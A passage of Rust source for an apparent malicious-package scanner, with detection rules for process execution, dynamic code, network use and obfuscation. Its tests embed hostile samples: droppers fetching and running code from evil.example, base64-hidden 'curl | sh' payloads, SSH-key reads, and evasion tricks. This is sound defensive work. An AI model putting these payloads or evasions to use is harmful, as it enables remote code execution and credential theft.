    let mut dyn_lines: Vec<u32> = fa
        .hits
        .iter()
        .filter(|(i, _)| *i == DYN_CODE)
        .map(|(_, l)| *l)
        .collect();
    let mut dec_lines: Vec<u32> = fa
        .hits
        .iter()
        .filter(|(i, _)| *i == DECODE_OBF)
        .map(|(_, l)| *l)
        .collect();
    dec_lines.sort_unstable();
    dec_lines.dedup();
    dyn_lines.sort_unstable();
    dyn_lines.dedup();
    fa.exec_decoded_lines = dyn_lines
        .iter()
        .filter(|l| dec_lines.binary_search(l).is_ok())
        .count() as u64;
}

/// One Python import statement: `from <level dots><module> import <names>` or
/// `import <module>` (level 0, no names).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PyImport {
    pub level: usize,
    pub module: String,
    pub names: Vec<String>,
}

/// Import statements at the start of a logical line (`import x` inside an `if` body still
/// counts; an import after `:` on the same line does not).
pub fn python_imports(text: &str) -> Vec<PyImport> {
    let toks = lex(text, Lang::Python);
    let mut out = Vec::new();
    let mut i = 0;
    let ident = |i: usize| {
        toks.get(i)
            .filter(|t| t.kind == TokKind::Ident && t.text != "import" && t.text != "as")
            .map(|t| t.text)
    };
    // `name ("." name)*`
    let dotted = |i: &mut usize| -> String {
        let mut m = String::new();
        if let Some(first) = ident(*i) {
            m.push_str(first);
            *i += 1;
            while toks.get(*i).is_some_and(|t| t.text == ".") {
                let Some(next) = ident(*i + 1) else { break };
                m.push('.');
                m.push_str(next);
                *i += 2;
            }
        }
        m
    };
    while i < toks.len() {
        let start = i == 0 || toks[i - 1].kind == TokKind::Newline;
        let t = toks[i];
        i += 1;
        if !start || t.kind != TokKind::Ident {
            continue;
        }
        if t.text == "import" {
            loop {
                let m = dotted(&mut i);
                if !m.is_empty() {
                    out.push(PyImport {
                        level: 0,
                        module: m,
                        names: Vec::new(),
                    });
                }
                if toks.get(i).is_some_and(|t| t.text == "as") {
                    i += 2;
                }
                if toks.get(i).is_some_and(|t| t.text == ",") {
                    i += 1;
                } else {
                    break;
                }
            }
        } else if t.text == "from" {
            let mut level = 0;
            while let Some(t) = toks.get(i).filter(|t| t.kind == TokKind::Punct) {
                if t.text.chars().all(|c| c == '.') {
                    level += t.text.len();
                    i += 1;
                } else {
                    break;
                }
            }
            let module = dotted(&mut i);
            if !toks.get(i).is_some_and(|t| t.text == "import") {
                continue;
            }
            i += 1;
            let mut names = Vec::new();
            let mut after_as = false;
            while let Some(t) = toks.get(i) {
                match t.kind {
                    TokKind::Newline => break,
                    TokKind::Ident if t.text == "as" => after_as = true,
                    TokKind::Ident => {
                        if !after_as {
                            names.push(t.text.to_string());
                        }
                        after_as = false;
                    }
                    _ => after_as = false,
                }
                i += 1;
            }
            if level > 0 || !module.is_empty() {
                out.push(PyImport {
                    level,
                    module,
                    names,
                });
            }
        }
    }
    out
}

/// Small helper view over a token slice.
struct View<'a, 'b> {
    t: &'b [Token<'a>],
}

impl<'a> View<'a, '_> {
    fn text(&self, i: usize) -> &'a str {
        self.t.get(i).map(|t| t.text).unwrap_or("")
    }
    fn kind(&self, i: usize) -> Option<TokKind> {
        self.t.get(i).map(|t| t.kind)
    }
    fn is_punct(&self, i: usize, p: &str) -> bool {
        self.t
            .get(i)
            .is_some_and(|t| t.kind == TokKind::Punct && t.text == p)
    }
    fn prev_is(&self, i: usize, p: &str) -> bool {
        i > 0 && self.is_punct(i - 1, p)
    }
    /// Identifier before the `.` that precedes token `i` (`os` in `os.system`), or the
    /// module a Python dynamic import before it returns (`__import__('os').system`).
    fn receiver(&self, i: usize) -> Option<&'a str> {
        if i < 2 || !self.is_punct(i - 1, ".") {
            return None;
        }
        if self.kind(i - 2) == Some(TokKind::Ident) {
            return Some(self.text(i - 2));
        }
        if i >= 5 && self.is_punct(i - 2, ")") {
            return self
                .dyn_import(i - 5)
                .filter(|&(_, end)| end == i - 1)
                .map(|(m, _)| m);
        }
        None
    }
    /// `__import__('a.b')` or `import_module('a.b')` at `i`, with one literal argument: the
    /// module the call returns (`a` and `a.b` respectively, as Python does) and the index
    /// after the closing parenthesis.
    fn dyn_import(&self, i: usize) -> Option<(&'a str, usize)> {
        let top = match self.text(i) {
            "__import__" => true,
            "import_module" => false,
            _ => return None,
        };
        if self.kind(i) != Some(TokKind::Ident)
            || !self.is_punct(i + 1, "(")
            || self.kind(i + 2) != Some(TokKind::Str)
            || !self.is_punct(i + 3, ")")
        {
            return None;
        }
        let m = self.text(i + 2);
        Some((if top { m.split('.').next()? } else { m }, i + 4))
    }
    fn after_dot(&self, i: usize) -> bool {
        self.prev_is(i, ".") || self.prev_is(i, "?.")
    }
    fn call(&self, i: usize) -> bool {
        self.is_punct(i + 1, "(")
    }
    /// Indices of tokens inside the call parentheses that open at `i + 1`.
    fn call_args(&self, i: usize) -> std::ops::Range<usize> {
        let start = i + 2;
        let mut depth = 1usize;
        let mut j = start;
        while j < self.t.len() {
            if self.t[j].kind == TokKind::Punct {
                match self.t[j].text {
                    "(" | "[" | "{" => depth += 1,
                    ")" | "]" | "}" => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
            }
            j += 1;
        }
        start..j.min(self.t.len())
    }
}

fn python_rules(code: &[Token<'_>], fa: &mut FileAnalysis) {
    let v = View { t: code };
    // Whether the current logical line is an import statement.
    let mut in_import = false;
    for (i, tok) in code.iter().enumerate() {
        if tok.kind == TokKind::Newline {
            in_import = false;
            continue;
        }
        if tok.kind != TokKind::Ident {
            continue;
        }
        let name = tok.text;
        let line = tok.line;
        let prev = if i > 0 { v.text(i - 1) } else { "" };
        let at_stmt_start = i == 0 || v.kind(i - 1) == Some(TokKind::Newline);
        if at_stmt_start && (name == "import" || name == "from") {
            in_import = true;
            continue;
        }
        let recv = v.receiver(i);
        let after_dot = v.after_dot(i);
        let bare_call = !after_dot && v.call(i) && prev != "def";
        // A module loaded by name counts as imported: `__import__('subprocess')`.
        let loaded = v
            .dyn_import(i)
            .map(|(m, _)| m.split('.').next().unwrap_or(m));
        // `getattr(os, 'system')`, also on a module loaded by name.
        let by_getattr = (bare_call && name == "getattr")
            .then(|| py_getattr(&v, i))
            .flatten();

        // proc_exec
        if name == "subprocess"
            || loaded == Some("subprocess")
            || recv.is_some_and(|r| py_proc_attr(r, name))
            || by_getattr.is_some_and(|(r, a)| r == "subprocess" || py_proc_attr(r, a))
            || (bare_call
                && matches!(
                    name,
                    "Popen"
                        | "check_output"
                        | "check_call"
                        | "getoutput"
                        | "getstatusoutput"
                        | "system"
                        | "popen"
                ))
        {
            fa.hit(PROC_EXEC, line);
        }

        // dyn_code
        let py2_exec_stmt = name == "exec" && !after_dot && v.kind(i + 1) == Some(TokKind::Str);
        if (bare_call
            && matches!(
                name,
                "eval" | "exec" | "compile" | "execfile" | "__import__"
            ))
            || py2_exec_stmt
            || (name == "import_module" && v.call(i))
            || name == "__builtins__"
        {
            fa.hit(DYN_CODE, line);
        }

        // network: module names used as modules (imported or dereferenced).
        let module_use = in_import || v.is_punct(i + 1, ".");
        if (module_use && PY_NET_MODULES.contains(&name) && !after_dot)
            || loaded.is_some_and(|m| PY_NET_MODULES.contains(&m))
            || by_getattr.is_some_and(|(r, _)| PY_NET_MODULES.contains(&r))
            || (recv == Some("http") && name == "client")
            || (bare_call && matches!(name, "urlopen" | "urlretrieve"))
        {
            fa.hit(NETWORK, line);
        }

        // decode_obf
        if matches!(
            name,
            "b64decode"
                | "b32decode"
                | "b16decode"
                | "b85decode"
                | "a85decode"
                | "urlsafe_b64decode"
                | "decodebytes"
                | "decodestring"
                | "unhexlify"
                | "a2b_base64"
                | "a2b_hex"
                | "fromhex"
                | "rot13"
                | "rot_13"
        ) || (matches!(recv, Some("zlib" | "gzip" | "bz2" | "lzma")) && name == "decompress")
            || (recv == Some("marshal") && matches!(name, "loads" | "load"))
            || (recv == Some("codecs") && name == "decode")
        {
            fa.hit(DECODE_OBF, line);
        }

        // env_access
        if matches!(name, "environ" | "environb" | "getenv") && !in_import {
            fa.hit(ENV_ACCESS, line);
        }

        // recon
        if (recv == Some("platform") && matches!(name, "node" | "uname"))
            || (recv == Some("os") && name == "uname")
            || (!in_import && matches!(name, "gethostname" | "getfqdn" | "getuser" | "getlogin"))
        {
            fa.hit(RECON, line);
        }

        // file_write
        let open_call = name == "open"
            && v.call(i)
            && (!after_dot || matches!(recv, Some("io" | "codecs" | "builtins")))
            && prev != "def";
        if open_call && py_open_writes(&v, i) {
            fa.hit(FILE_WRITE, line);
        }
        if (after_dot && matches!(name, "write_text" | "write_bytes"))
            || (recv == Some("shutil")
                && matches!(
                    name,
                    "copy" | "copy2" | "copyfile" | "copyfileobj" | "copytree" | "move"
                ))
            || (recv == Some("os") && name == "chmod")
        {
            fa.hit(FILE_WRITE, line);
        }
    }
}

const PY_NET_MODULES: &[&str] = &[
    "requests",
    "urllib",
    "urllib2",
    "urllib3",
    "httplib",
    "httpx",
    "aiohttp",
    "socket",
    "ftplib",
    "smtplib",
    "telnetlib",
    "paramiko",
    "pycurl",
    "websocket",
    "websockets",
];

/// Whether `recv.name` runs a process (`os.system`, `os.execv`, `pty.spawn`).
fn py_proc_attr(recv: &str, name: &str) -> bool {
    (recv == "os"
        && (matches!(name, "system" | "popen" | "popen2" | "popen3" | "startfile")
            || name.starts_with("exec")
            || name.starts_with("spawn")
            || name.starts_with("posix_spawn")))
        || (recv == "pty" && name == "spawn")
}

/// `getattr(m, 'attr')` at `i`, where `m` is a name or a module loaded by name: the
/// module (top-level package) and the attribute.
fn py_getattr<'a>(v: &View<'a, '_>, i: usize) -> Option<(&'a str, &'a str)> {
    let args = v.call_args(i);
    let (module, next) = match v.dyn_import(args.start) {
        Some((m, end)) => (m, end),
        None if v.kind(args.start) == Some(TokKind::Ident) => (v.text(args.start), args.start + 1),
        None => return None,
    };
    if !v.is_punct(next, ",") || v.kind(next + 1) != Some(TokKind::Str) || next + 2 != args.end {
        return None;
    }
    let top = module.split('.').next().unwrap_or(module);
    Some((top, v.text(next + 1)))
}

fn py_open_writes(v: &View<'_, '_>, i: usize) -> bool {
    v.call_args(i).any(|j| {
        v.kind(j) == Some(TokKind::Str) && {
            let s = v.text(j);
            !s.is_empty()
                && s.len() <= 4
                && s.bytes().all(|b| b"rwxabt+".contains(&b))
                && s.bytes().any(|b| b"wax".contains(&b))
        }
    })
}

const JS_NET_MODULES: &[&str] = &[
    "http",
    "https",
    "net",
    "dgram",
    "tls",
    "dns",
    "node:http",
    "node:https",
    "node:net",
    "node:dgram",
    "node:tls",
    "node:dns",
    "axios",
    "request",
    "node-fetch",
    "got",
    "ws",
    "socket.io-client",
    "superagent",
    "needle",
    "undici",
];

fn js_rules(code: &[Token<'_>], fa: &mut FileAnalysis) {
    let v = View { t: code };
    let has_cp = code.iter().any(|t| {
        t.kind == TokKind::Str && matches!(t.text, "child_process" | "node:child_process")
    });
    for (i, tok) in code.iter().enumerate() {
        let line = tok.line;
        if tok.kind == TokKind::Str {
            let s = tok.text;
            // A module specifier: `require("x")`, `from "x"`, `import "x"`, `import("x")`.
            let is_spec =
                (i >= 2 && v.prev_is(i, "(") && matches!(v.text(i - 2), "require" | "import"))
                    || (i >= 1
                        && v.kind(i - 1) == Some(TokKind::Ident)
                        && matches!(v.text(i - 1), "from" | "import"));
            if !is_spec {
                continue;
            }
            if matches!(
                s,
                "child_process" | "node:child_process" | "shelljs" | "execa" | "cross-spawn"
            ) {
                fa.hit(PROC_EXEC, line);
            }
            if JS_NET_MODULES.contains(&s) {
                fa.hit(NETWORK, line);
            }
            if (s.starts_with("./") || s.starts_with("../")) && fa.relative_imports.len() < 64 {
                fa.relative_imports.push(s.to_string());
            }
            continue;
        }
        if tok.kind != TokKind::Ident {
            continue;
        }
        let name = tok.text;
        let recv = v.receiver(i);
        let after_dot = v.after_dot(i);
        let prev = if i > 0 { v.text(i - 1) } else { "" };
        let call = v.call(i);

        // proc_exec
        if matches!(name, "execSync" | "spawnSync" | "execFileSync" | "execFile")
            || (has_cp && call && matches!(name, "exec" | "spawn" | "fork"))
        {
            fa.hit(PROC_EXEC, line);
        }

        // dyn_code
        let non_literal_require = (name == "require" || name == "import")
            && !after_dot
            && call
            && !(v.kind(i + 2) == Some(TokKind::Str) && v.is_punct(i + 3, ")"));
        if (name == "eval" && call && prev != "function")
            || (name == "Function" && call && !after_dot)
            || matches!(
                name,
                "runInNewContext" | "runInThisContext" | "runInContext"
            )
            || (recv == Some("vm") && matches!(name, "Script" | "compileFunction"))
            || non_literal_require
        {
            fa.hit(DYN_CODE, line);
        }

        // network
        if (name == "fetch" && call && prev != "function")
            || matches!(name, "axios" | "XMLHttpRequest" | "WebSocket")
            || (matches!(recv, Some("http" | "https")) && matches!(name, "request" | "get"))
            || (recv == Some("net") && matches!(name, "connect" | "createConnection" | "Socket"))
            || (recv == Some("dns")
                && matches!(
                    name,
                    "lookup" | "resolve" | "resolve4" | "resolve6" | "resolveTxt" | "resolveAny"
                ))
        {
            fa.hit(NETWORK, line);
        }

        // decode_obf
        let buffer_decode = recv == Some("Buffer")
            && name == "from"
            && call
            && v.call_args(i).any(|j| {
                v.kind(j) == Some(TokKind::Str)
                    && matches!(v.text(j), "base64" | "hex" | "base64url")
            });
        if (name == "atob" && call)
            || buffer_decode
            || (recv == Some("String") && matches!(name, "fromCharCode" | "fromCodePoint"))
            || (name == "unescape" && call && !after_dot)
            || matches!(
                name,
                "inflateSync"
                    | "gunzipSync"
                    | "inflateRawSync"
                    | "unzipSync"
                    | "brotliDecompressSync"
                    | "rot13"
            )
        {
            fa.hit(DECODE_OBF, line);
        }

        // env_access
        if recv == Some("process") && name == "env" {
            fa.hit(ENV_ACCESS, line);
        }

        // recon
        if matches!(name, "userInfo" | "networkInterfaces")
            || (recv == Some("os") && name == "hostname")
        {
            fa.hit(RECON, line);
        }

        // file_write
        if matches!(
            name,
            "writeFile"
                | "writeFileSync"
                | "appendFile"
                | "appendFileSync"
                | "createWriteStream"
                | "copyFile"
                | "copyFileSync"
                | "chmod"
                | "chmodSync"
        ) {
            fa.hit(FILE_WRITE, line);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn python_import_statements() {
        let src = "import os, a.b as c\nfrom . import core, util as u\nfrom ..pkg.mod import (x,\n  y)\nfrom pkg import *\nif t:\n    import z\nx = 'import nope'\n";
        let got = python_imports(src);
        let want = [
            (0, "os", vec![]),
            (0, "a.b", vec![]),
            (1, "", vec!["core", "util"]),
            (2, "pkg.mod", vec!["x", "y"]),
            (0, "pkg", vec![]),
            (0, "z", vec![]),
        ];
        assert_eq!(got.len(), want.len(), "{got:?}");
        for (g, (level, module, names)) in got.iter().zip(want) {
            assert_eq!((g.level, g.module.as_str()), (level, module));
            assert_eq!(g.names, names);
        }
    }

    #[test]
    fn split_literals_are_folded() {
        // The red team's string_split evasion, and the hand-written form of it.
        let c = js("const cp = require(('child_' + 'process'));\ncp.exec('ls');\n");
        assert_eq!(c[PROC_EXEC], 2);
        assert_eq!(
            js("require('chi' + 'ld_' + 'process').exec(x);\n")[PROC_EXEC],
            2
        );
        assert_eq!(js("fetch('https://' + 'evil.example/x');\n")[URL], 1);
        let fa = analyze(
            "import os\nk = open(os.path.expanduser('~/.s' + 'sh/id_' + 'rsa'))\n",
            Lang::Python,
        );
        assert_eq!(fa.counts[SECRET_PATHS], 2);
        assert!(fa.hits.iter().all(|h| h.1 == 2));
        // Python implicit concatenation across lines keeps each part's own line.
        let fa = analyze("x = ('aaa'\n     '~/.ss' 'h/id_rsa')\n", Lang::Python);
        assert_eq!(fa.hits, vec![(SECRET_PATHS, 2), (SECRET_PATHS, 2)]);
        let fa = analyze(
            "x = ('aaa'\n  'bbb'\n  'ccc ~/.aws/credentials')\n",
            Lang::Python,
        );
        assert_eq!(fa.hits, vec![(SECRET_PATHS, 3)]);
        // A base64 payload cut into chunks is one long run again.
        let chunks: Vec<String> = (0..8).map(|_| format!("'{}'", "QUFB".repeat(10))).collect();
        let fa = analyze(&format!("p = ({})\n", chunks.join(" +\n  ")), Lang::Python);
        assert_eq!(fa.longest_b64_run, 320);
    }

    #[test]
    fn escaped_literals_are_decoded() {
        // The red team's hex_escape evasion: every string literal spelled as escapes.
        let c = js("const cp = require('\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73');\ncp.exec('ls');\n");
        assert_eq!(c[PROC_EXEC], 2);
        assert_eq!(js("fetch('\\u0068ttps://evil.example/x');\n")[URL], 1);
        let fa = analyze(
            "import os\nk = open(os.path.expanduser('~/.ss\\x68/id_rsa'))\n",
            Lang::Python,
        );
        assert_eq!(fa.counts[SECRET_PATHS], 2);
        // Raw strings keep their backslashes.
        let url = |src: &str| analyze(src, Lang::Python).counts[URL];
        assert_eq!(url("u = '\\x68ttps://evil.example/x'\n"), 1);
        assert_eq!(url("u = r'\\x68ttps://evil.example/x'\n"), 0);
    }

    #[test]
    fn reversed_literals_are_read_forwards() {
        // The red team's reverse_strings evasion: every literal stored backwards.
        let c = js(
            "const cp = require('ssecorp_dlihc'.split('').reverse().join(''));\ncp.exec('ls');\n",
        );
        assert_eq!(c[PROC_EXEC], 2);
        assert_eq!(
            js("fetch([...'x/elpmaxe.live//:sptth'].reverse().join(''));\n")[URL],
            1
        );
        assert_eq!(py("k = open('asr_di/hss./~'[::-1])\n")[SECRET_PATHS], 2);
        assert_eq!(
            py("u = ''.join(reversed('x/elpmaxe.live//:sptth'))\n")[URL],
            1
        );
        // Escapes are decoded first, and a reversed half still folds with its neighbour.
        assert_eq!(py("u = 'https://' + 'x/elpmaxe.l\\x69ve'[::-1]\n")[URL], 1);
    }

    #[test]
    fn literal_code_is_analyzed_as_code() {
        // Code run from a literal counts like the same code written out, plus the call.
        let same = |wrapped: [u32; N_IND], plain: [u32; N_IND], extra_dyn: u32| {
            for i in 0..N_IND {
                let want = plain[i] + if i == DYN_CODE { extra_dyn } else { 0 };
                assert_eq!(wrapped[i], want, "indicator {i}");
            }
        };
        // The shape of a 2026 .pth dropper: the payload is a string handed to exec.
        let payload = "import subprocess as _s,urllib.request as _u\n\
                       _u.urlretrieve(\"https://evil.example/b\", \"/tmp/b\")\n\
                       _s.Popen([\"/tmp/b\"])\n";
        let wrapped = format!("exec('{}')\n", payload.replace('\n', "\\n"));
        let c = py(&wrapped);
        assert!(c[PROC_EXEC] >= 1 && c[NETWORK] >= 1 && c[URL] == 1);
        same(c, py(payload), 1);
        same(
            py("exec(\"exec('import socket\\\\nsocket.socket()')\")\n"),
            py("import socket\nsocket.socket()\n"),
            2,
        );
        same(
            py("exec(compile('import socket\\nsocket.socket()', '<x>', 'exec'))\n"),
            py("import socket\nsocket.socket()\n"),
            2,
        );
        // JavaScript eval and Function bodies; parameter names are not code.
        let plain = js("require('child_process').exec('id')\n");
        assert!(plain[PROC_EXEC] >= 1);
        same(
            js("eval(\"require('child_process').exec('id')\")\n"),
            plain,
            1,
        );
        same(
            js("new Function('a', \"require('child_process').exec('id')\");\n"),
            plain,
            1,
        );
        // A URL inside the code is counted once, not again as part of the outer literal.
        assert_eq!(py("exec(\"u = 'https://evil.example/x'\")\n")[URL], 1);
        // A single-line literal puts every hit on its own line; a multi-line one keeps lines.
        let fa = analyze(
            "a = 1\nexec('import socket\\nsocket.socket()')\n",
            Lang::Python,
        );
        assert!(fa.hits.contains(&(NETWORK, 2)));
        let fa = analyze(
            "a = 1\nexec('''\nimport socket\nsocket.socket()\n''')\n",
            Lang::Python,
        );
        assert!(fa.hits.contains(&(NETWORK, 4)));
        // Code that is not a literal, methods named exec, and bundler modules named by a
        // sourceURL comment are left alone.
        assert_eq!(py("exec(code)\n")[NETWORK], 0);
        let bundled =
            "eval(\"require('child_process').exec('id')\\n//# sourceURL=webpack:///./a.js\")\n";
        assert_eq!(js(bundled)[PROC_EXEC], 0);
        let c = py("cursor.exec('import socket\\nsocket.socket()')\n");
        assert_eq!((c[NETWORK], c[DYN_CODE]), (0, 0));
    }

    #[test]
    fn encoded_and_command_line_code_is_read() {
        let py_b64 = "aW1wb3J0IHN1YnByb2Nlc3MsdXJsbGliLnJlcXVlc3QgYXMgdQp1LnVybHJldHJpZXZlKCJodHRwczovL2V2aWwuZXhhbXBsZS9iIiwgIi90bXAvYiIpCnN1YnByb2Nlc3MuUG9wZW4oWyIvdG1wL2IiXSkK";
        // exec over a base64 literal decoded in place: the decoded code is read.
        for wrapped in [
            format!("import base64\nexec(base64.b64decode('{py_b64}'))\n"),
            format!("import base64\nexec(base64.b64decode('{py_b64}').decode())\n"),
            format!("from base64 import b64decode as d\nexec(compile(b64decode(\"{py_b64}\"), '<s>', 'exec'))\n"),
        ] {
            let c = py(&wrapped);
            assert!(c[NETWORK] >= 1 && c[PROC_EXEC] >= 1 && c[URL] == 1, "{wrapped}");
        }
        // The same literal without a decoder around it is just data.
        let c = py(&format!("exec('{py_b64}')\n"));
        assert_eq!((c[NETWORK], c[URL]), (0, 0));
        // JavaScript atob and Buffer.from(.., 'base64').
        let js_b64 = "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveCB8IHNoJyk=";
        for wrapped in [
            format!("eval(atob('{js_b64}'))\n"),
            format!("eval(Buffer.from('{js_b64}', 'base64').toString())\n"),
            format!("new Function(Buffer.from(\"{js_b64}\", \"base64\").toString('utf8'))()\n"),
        ] {
            let c = js(&wrapped);
            assert!(c[PROC_EXEC] >= 1 && c[URL] == 1, "{wrapped}");
        }
        // Compressed before encoding: exec(zlib.decompress(b64decode(..))).
        let c = py("import zlib, base64\n\
                    exec(zlib.decompress(base64.b64decode(\
                    'eJzLzC3ILypRKM5Pzk4t4YJQehBKQ1MvOT8vLzW5RENDKbUsM0cvtSIxtyAnVUlHwQQINDW5AM3KFM4=')))\n");
        assert!(c[NETWORK] >= 1);
        let c = js("eval(zlib.inflateSync(Buffer.from(\
                    'eJwrSi0szSxK1VBPzsjMSYkvKMpPTi0uVtfUS61ITdZQz0xR1wQA7EoMPg==', 'base64')).toString())\n");
        assert!(c[PROC_EXEC] >= 1);
        // Python run through an interpreter's -c flag (the litellm 1.82.8 .pth shape).
        let c = py("import subprocess, sys\n\
                    subprocess.Popen([sys.executable, '-c', 'import socket\\nsocket.socket()'])\n");
        assert!(c[NETWORK] >= 1);
        let c =
            py("import subprocess\nsubprocess.run(['/usr/bin/python3', '-c', 'import socket'])\n");
        assert!(c[NETWORK] >= 1);
        // `-c` for another program is not Python.
        let c = py("import subprocess\nsubprocess.run(['sh', '-c', 'import socket'])\n");
        assert_eq!(c[NETWORK], 0);
    }

    #[test]
    fn base64_text_decoding() {
        assert_eq!(
            decode_base64_text("aW1wb3J0IG9zCg==", false).as_deref(),
            Some("import os\n")
        );
        assert_eq!(
            decode_base64_text("aW1wb3J0\\nIG9zCg", false).as_deref(),
            Some("import os\n")
        );
        // Not base64, too short, or binary once decoded.
        // zlib (Python zlib.compress) and gzip both inflate.
        let z = "eJzLzC3ILypRKM5Pzk4t4YJQehBKQ1MvOT8vLzW5RENDKbUsM0cvtSIxtyAnVUlHwQQINDW5AM3KFM4=";
        let g = "H4sIAAAAAAAC/8vMLcgvKlEozk/OTi3hglB6EEpDUy85Py8vNblEQ0MptSwzRy+1IjG3ICdVSUfBBAg0NbkABS4RFz4AAAA=";
        for s in [z, g] {
            let text = decode_base64_text(s, true).unwrap();
            assert!(text.starts_with("import socket\n"));
            assert_eq!(decode_base64_text(s, false), None);
        }
        assert_eq!(decode_base64_text("not base64 at all!", false), None);
        assert_eq!(decode_base64_text("aGk=", false), None);
        assert_eq!(decode_base64_text("AAECAwQFBgcICQoLDA0ODw==", false), None);
    }

    #[test]
    fn joined_pieces_are_read_whole() {
        // The red team's array_join evasion: every literal split into joined pieces.
        let c = js("const cp = require(['chil', 'd_pro', 'cess'].join(''));\ncp.exec('ls');\n");
        assert_eq!(c[PROC_EXEC], 2);
        assert_eq!(
            py("u = ''.join(['https://', 'evil.ex', 'ample/x'])\n")[URL],
            1
        );
        assert_eq!(
            py("k = open('/'.join(['~', '.ssh', 'id_rsa']))\n")[SECRET_PATHS],
            2
        );
        // A joined piece folds with its neighbours, and a reversed piece joins forwards.
        assert_eq!(
            py("u = 'https://' + ''.join(['evil.', 'elpmaxe'[::-1]]) + '/x'\n")[URL],
            1
        );
        // A join over anything but literals is left alone.
        assert_eq!(py("u = ''.join(['https://', host, '/x'])\n")[URL], 0);
    }

    #[test]
    fn modules_loaded_by_name() {
        // Python's counterpart of `require('child_process')`.
        assert_eq!(py("__import__('os').system('id')\n")[PROC_EXEC], 1);
        assert_eq!(
            py("import importlib\nimportlib.import_module('subprocess').run(['id'])\n")[PROC_EXEC],
            1
        );
        assert_eq!(
            py("m = __import__('subprocess')\nm.Popen(['id'])\n")[PROC_EXEC],
            1
        );
        assert_eq!(
            py("getattr(__import__('os'), 'system')('id')\n")[PROC_EXEC],
            1
        );
        assert_eq!(py("import os\ngetattr(os, 'system')('id')\n")[PROC_EXEC], 1);
        assert_eq!(py("__import__('socket').socket()\n")[NETWORK], 1);
        assert_eq!(
            py("__import__('urllib.request').request.urlopen(u)\n")[NETWORK],
            1
        );
        // Still dynamic code, and harmless modules or attributes count for nothing else.
        let c = py("__import__('os').path.join('a', 'b')\ngetattr(os, 'getcwd')()\n");
        assert_eq!((c[DYN_CODE], c[PROC_EXEC], c[NETWORK]), (1, 0, 0));
        // `import_module('os.path')` returns os.path, not os; `__import__` returns the package.
        assert_eq!(py("import_module('os.path').system('x')\n")[PROC_EXEC], 0);
        assert_eq!(py("__import__('os.path').system('x')\n")[PROC_EXEC], 1);
        // A computed module name is not resolved.
        assert_eq!(py("__import__(name).system('x')\n")[PROC_EXEC], 0);
    }

    #[test]
    fn folding_respects_precedence() {
        // `'a' + 'b'.join(x)` adds 'a' to a call's result; `x * 'a' + 'b'` repeats 'a' only.
        let fa = analyze("s = '~/.s' + 'sh'.join(x)\n", Lang::Python);
        assert_eq!(fa.counts[SECRET_PATHS], 0);
        let fa = analyze("s = n * '~/.s' + 'sh'\n", Lang::Python);
        assert_eq!(fa.counts[SECRET_PATHS], 0);
        // JavaScript has no implicit concatenation; adjacent literals stay apart.
        assert_eq!(js("x = ['~/.s', 'sh']\n")[SECRET_PATHS], 0);
        // Python's binds tighter than `%`, so it folds even before one.
        assert_eq!(py("s = '~/.s' 'sh/%s' % k\n")[SECRET_PATHS], 1);
        // A call's own parentheses are kept: the callee still sees its argument.
        assert_eq!(py("__import__('o' + 's')\n")[DYN_CODE], 1);
    }

    #[test]
    fn many_hits_in_one_long_string_stay_linear() {
        // Fuzzer finding: a 780 KB string literal holding 55K secret paths took 115 s,
        // because every match counted newlines from the start of the string.
        let body = "~/.ssh/id_rsa ".repeat(40_000);
        let src = format!("x = 1\ny = '{body}'\n");
        let t = std::time::Instant::now();
        let fa = analyze(&src, Lang::Python);
        assert!(t.elapsed().as_secs() < 20, "took {:?}", t.elapsed());
        assert!(fa.counts[SECRET_PATHS] >= 40_000);
        assert_eq!(fa.hits.first(), Some(&(SECRET_PATHS, 2)));
        // Line numbers still count the newlines inside the string.
        let fa = analyze("a = 1\nb = '''x\n\ny ~/.aws/credentials'''\n", Lang::Python);
        assert_eq!(fa.hits, vec![(SECRET_PATHS, 4)]);
    }

    #[test]
    fn rules_use_ascii_word_boundaries() {
        // A Unicode \b sends the regex crate to a slow engine on any non-ASCII input.
        for set in [&*STRING_RULES, &*SHELL_RULES] {
            for r in &set.rules {
                let pat = r.re.as_str().replace(r"(?-u:\b)", "");
                assert!(!pat.contains(r"\b"), "Unicode word boundary in {pat}");
            }
        }
        // Keywords next to non-ASCII text still match.
        let fa = analyze("x = '\u{e9}t\u{e9} whoami \u{1f4a9}'\n", Lang::Python);
        assert_eq!(fa.counts[RECON], 1);
    }

    #[test]
    fn hidden_whitespace_and_exec_of_decoded_data() {
        let src = format!(
            "import os{};__import__('builtins').exec(__import__('base64').b64decode('aGk='))\nx = 1\n",
            " ".repeat(250)
        );
        let fa = analyze(&src, Lang::Python);
        assert_eq!(fa.hidden_ws_lines, 1);
        assert_eq!(fa.exec_decoded_lines, 1);
        // Decoding and running on different lines is not the same-line shape.
        let fa = analyze(
            "import base64\ns = base64.b64decode(p)\nexec(s)\n",
            Lang::Python,
        );
        assert_eq!(fa.exec_decoded_lines, 0);
        assert_eq!(fa.hidden_ws_lines, 0);
        // The same shape inside a string handed to `python -c` or `node -e`.
        let fa = analyze(
            "import subprocess, sys\nsubprocess.Popen([sys.executable, \"-c\", \"import base64; exec(base64.b64decode('aGk='))\"])\n",
            Lang::Python,
        );
        assert_eq!(fa.exec_decoded_lines, 1);
        let fa = analyze(
            "node -e \"eval(Buffer.from(p, 'base64').toString())\"\n",
            Lang::Shell,
        );
        assert_eq!(fa.counts[DECODE_OBF], 1);
        let fa = analyze("s = 'call exec(...) after b64decode(x)'\n", Lang::Python);
        assert_eq!(fa.exec_decoded_lines, 0);
        // Leading whitespace this deep pushes code off screen too; short runs never count.
        let fa = analyze(&format!("{}x = 1\n", " ".repeat(120)), Lang::Js);
        assert_eq!(fa.hidden_ws_lines, 1);
        assert_eq!(hidden_ws_offset("a    b"), None);
    }

    fn py(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Python).counts
    }
    fn js(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Js).counts
    }
    fn sh(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Shell).counts
    }

    #[test]
    fn proc_exec_python() {
        assert_eq!(
            py("import subprocess\nsubprocess.run(['ls'])\n")[PROC_EXEC],
            2
        );
        assert_eq!(
            py("import os\nos.system('ls')\nos.popen('x')\nos.execvp('a', [])\n")[PROC_EXEC],
